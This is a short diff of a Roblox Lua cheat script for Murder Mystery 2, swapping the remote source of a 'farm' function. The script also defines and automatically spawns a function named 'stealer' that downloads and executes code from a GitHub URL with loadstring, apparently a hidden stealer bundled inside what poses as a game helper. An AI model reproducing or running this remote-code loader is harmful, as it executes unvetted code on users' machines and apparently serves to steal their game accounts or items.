@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Maxwellll635/murder-myster-2-scriptt/refs/heads/main/scrip'))()
 end
 local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Maxwellll635/murder-myster-2-scriptt/refs/heads/main/GUI'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua', false))()
 end
 
 task.spawn(stealer)
